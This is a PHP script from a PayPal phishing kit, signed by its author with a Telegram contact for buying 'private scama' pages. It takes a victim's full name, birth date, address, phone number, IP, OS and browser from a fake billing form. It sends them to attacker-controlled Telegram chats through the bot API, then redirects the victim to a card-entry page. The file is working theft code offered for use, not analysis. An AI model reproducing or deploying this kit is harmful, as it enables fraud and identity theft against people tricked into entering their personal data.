<?php
/*
Scama page by Nayfer
You want your private scama page ?
contact me on telegram @nayfercrax
*/
session_start();
error_reporting(0);
include "../myconfig/telegram.php";
include "../myconfig/settings.php";
$_SESSION['fnm'] = $_POST['fnm'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['adr'] = $_POST['adr'];
$_SESSION['cty'] = $_POST['cty'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['stt'] = $_POST['stt'];
$_SESSION['cnt'] = $_POST['cnt'];
$_SESSION['pnm'] = $_POST['pnm'];
$ip = getenv("REMOTE_ADDR");
 foreach($IdTelegram as $chatId) {
  $message = "[=====> 🔥🔥 PAYPAL [CRAXPRO.IO] | BILLING  🔥🔥  <=====]\n\n";
  $message .= "[ 👤  Full name :      ".$_POST['fnm']."   ]\n";
  $message .= "[ 👤  Date Of Birth :      ".$_POST['dob']."   ]\n";
  $message .= "[ 👤  Address :      ".$_POST['adr']."   ]\n";
  $message .= "[ 👤  City :      ".$_POST['cty']."   ]\n";
  $message .= "[ 👤  Zip code :      ".$_POST['zip']."   ]\n";
  $message .= "[ 👤  State :      ".$_POST['stt']."   ]\n";
  $message .= "[ 👤  Country :      ".$_POST['cnt']."   ]\n";
  $message .= "[ 👤  Phone number :      ".$_POST['pnm']."   ]\n";
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ 🔍 IP :    ".$ip."\n";   
  $message .= "[ 🌐 OS :    ".$user_os."\n";  
  $message .= "[ 🌐 Browser :    ".$user_browser."\n";  
  $message .= "[ 🌐 UA :    ".$_SERVER['HTTP_USER_AGENT']."\n\n"; 
  $message .= "[=====>  🔥 BY @nayfercrax 🔥  <=====]";
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
 $randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 20, 100);

?>
  <script type="text/javascript">window.location = "../signin/account_card.php?<?php echo $randomString ?>"</script>
